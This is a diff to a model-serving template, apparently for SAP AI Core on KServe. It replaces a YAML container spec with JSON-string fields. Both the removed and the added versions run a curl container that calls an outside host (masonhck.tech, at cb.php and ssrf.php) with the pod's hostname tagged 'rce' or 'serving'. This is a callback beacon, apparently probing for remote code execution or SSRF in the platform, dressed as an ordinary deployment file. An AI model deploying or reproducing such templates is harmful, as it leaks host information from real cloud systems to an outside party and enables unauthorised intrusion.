@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-serving"
-    ai.sap.com/version: "1.0.0"
+    ai.sap.com/version: "2.0.0"
 spec:
   inputs:
     parameters:
@@ -18,24 +18,5 @@ spec:
       default: "hello"
   template:
     apiVersion: "serving.kserve.io/v1beta1"
-    metadata:
-      annotations:
-        autoscaling.knative.dev/target: "1"
-      labels:
-        ai.sap.com/resourcePlan: starter
-    spec:
-      predictor:
-        minReplicas: 1
-        maxReplicas: 1
-        containers:
-        - name: server
-          image: curlimages/curl:latest
-          command:
-          - sh
-          - -c
-          - |
-            curl -s "https://www.masonhck.tech/cb.php?src=serving-rce-$(hostname)"
-            sleep 3600
-          ports:
-          - containerPort: 8080
-            protocol: TCP
+    metadata: '{"annotations":{"autoscaling.knative.dev/target":"1"},"labels":{"ai.sap.com/resourcePlan":"starter"}}'
+    spec: '{"predictor":{"minReplicas":1,"maxReplicas":1,"containers":[{"name":"server","image":"curlimages/curl:latest","command":["sh","-c","curl -s https://www.masonhck.tech/ssrf.php?src=serving-$(hostname) && sleep 3600"],"ports":[{"containerPort":8080}]}]}}'
